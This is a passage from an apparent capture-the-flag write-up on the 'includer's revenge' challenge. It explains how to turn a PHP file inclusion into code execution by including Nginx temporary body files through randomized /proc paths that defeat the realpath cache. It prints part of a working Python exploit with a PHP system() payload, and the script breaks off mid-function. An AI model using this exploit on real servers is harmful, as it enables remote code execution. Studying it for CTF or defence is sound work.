&amp;lt;p&amp;gt;To overcome this &amp;quot;feature&amp;quot; we decided to implement a straightforward bypass. Instead of attempting to access the same path over and over (through &amp;lt;code&amp;gt;&amp;#x2F;proc&amp;#x2F;&amp;amp;lt;nginx worker pid&amp;amp;gt;&amp;#x2F;fd&amp;#x2F;&amp;amp;lt;fd&amp;amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;) we thought about using a simple trick to access it in countless different ways:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;If we could find multiple different paths that link to the root directory, we can use them to build unique paths to our file descriptors.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Even though &amp;lt;code&amp;gt;&amp;#x2F;proc&amp;#x2F;&amp;amp;lt;some nginx worker pid&amp;amp;gt;&amp;#x2F;root&amp;#x2F;proc&amp;#x2F;&amp;amp;lt;nginx worker pid&amp;amp;gt;&amp;#x2F;fd&amp;#x2F;&amp;amp;lt;fd&amp;amp;gt;&amp;lt;&amp;#x2F;code&amp;gt; and &amp;lt;code&amp;gt;&amp;#x2F;proc&amp;#x2F;&amp;amp;lt;nginx worker pid&amp;amp;gt;&amp;#x2F;fd&amp;#x2F;&amp;amp;lt;fd&amp;amp;gt;&amp;lt;&amp;#x2F;code&amp;gt; resolve to the same path - adding the randomly generated prefixes makes the PHP realpath cache irrelevant. We use a random amount of &amp;lt;code&amp;gt;&amp;#x2F;proc&amp;#x2F;&amp;amp;lt;some nginx pid&amp;amp;gt;&amp;#x2F;root&amp;lt;&amp;#x2F;code&amp;gt; and &amp;lt;code&amp;gt;&amp;#x2F;proc&amp;#x2F;&amp;amp;lt;some nginx pid&amp;amp;gt;&amp;#x2F;cwd&amp;lt;&amp;#x2F;code&amp;gt; as components to build the path prefix since they all lead to &amp;lt;code&amp;gt;&amp;#x2F;&amp;lt;&amp;#x2F;code&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;This method is unique and is based on the underlying filesystem and operating system - making it harder to mitigate and patch.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Equipped with these strategies we tried to retrieve the flag and after about 3~ minutes we consistently managed to &amp;lt;code&amp;gt;include_once()&amp;lt;&amp;#x2F;code&amp;gt; the temporary file that contains our malicious payload in &amp;lt;code&amp;gt;includer&amp;#x27;s revenge&amp;lt;&amp;#x2F;code&amp;gt;!&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;exploit-implementation&amp;quot;&amp;gt;Exploit Implementation&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;We’ve used the following Python script to solve &amp;lt;code&amp;gt;includer&amp;#x27;s revenge&amp;lt;&amp;#x2F;code&amp;gt; (and a slightly modified version for &amp;lt;code&amp;gt;counter&amp;lt;&amp;#x2F;code&amp;gt;):&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;python&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-python &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-python&amp;quot; data-lang=&amp;quot;python&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;requests
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;threading
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;multiprocessing
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;threading
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;random
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;SERVER &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;http:&amp;#x2F;&amp;#x2F;localhost:8088&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;NGINX_PIDS_CACHE &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;set&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;([&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;34&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;35&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;36&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;37&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;38&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;39&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;40&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;41&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;])
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Set the following to True to use the above set of PIDs instead of scanning:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;USE_NGINX_PIDS_CACHE &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;False
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;create_requests_session&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;():
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    session &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;requests.Session()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Create a large HTTP connection pool to make HTTP requests as fast as possible without TCP handshake overhead
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    adapter &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;requests.adapters.HTTPAdapter(pool_connections&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;1000&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, pool_maxsize&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;10000&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;session.mount(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;http:&amp;#x2F;&amp;#x2F;&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, adapter)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;session
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;get_nginx_pids&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;requests_session&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;USE_NGINX_PIDS_CACHE&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;NGINX_PIDS_CACHE
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    nginx_pids &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;set&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Scan up to PID 200
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;range&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;200&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        cmdline &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;requests_session.get(SERVER &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;f&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;#x2F;?action=read&amp;amp;amp;file=&amp;#x2F;proc&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;{i}&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;#x2F;cmdline&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;.text
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;cmdline.startswith(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;nginx: worker process&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;nginx_pids.add(i)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;nginx_pids
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;send_payload&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;requests_session&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;body_size&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;1024000&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;try&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# The file path (&amp;#x2F;bla) doesn&amp;amp;#39;t need to exist - we simply need to upload a large body to Nginx and fail fast
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        payload &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;&amp;amp;lt;?php system(&amp;amp;quot;&amp;#x2F;readflag&amp;amp;quot;); ?&amp;amp;gt; &amp;#x2F;&amp;#x2F;&amp;amp;#39;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;requests_session.post(SERVER &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;#x2F;?action=read&amp;amp;amp;file=&amp;#x2F;bla&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, data&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(payload &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;a&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;* &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(body_size &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;- &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;len&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(payload)))))
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;except&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;pass
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;send_payload_worker&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;requests_session&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;while &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;True&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;send_payload(requests_session)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;send_payload_multiprocess&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;requests_session&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Use all CPUs to send the payload as request body for Nginx
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;_ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;range&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(multiprocessing.cpu_count())&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        p &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;multiprocessing.Process(target&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;send_payload_worker, args&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(requests_session,))
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;p.start()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;generate_random_path_prefix&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;nginx_pids&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# This method creates a path from random amount of ProcFS path components. A generated path will look like &amp;#x2F;proc&amp;#x2F;&amp;amp;lt;nginx pid 1&amp;amp;gt;&amp;#x2F;cwd&amp;#x2F;proc&amp;#x2F;&amp;amp;lt;nginx pid 2&amp;amp;gt;&amp;#x2F;root&amp;#x2F;proc&amp;#x2F;&amp;amp;lt;nginx pid 3&amp;amp;gt;&amp;#x2F;root
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    path &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    component_num &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;random.randint(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;10&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;_ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;range&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(component_num)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
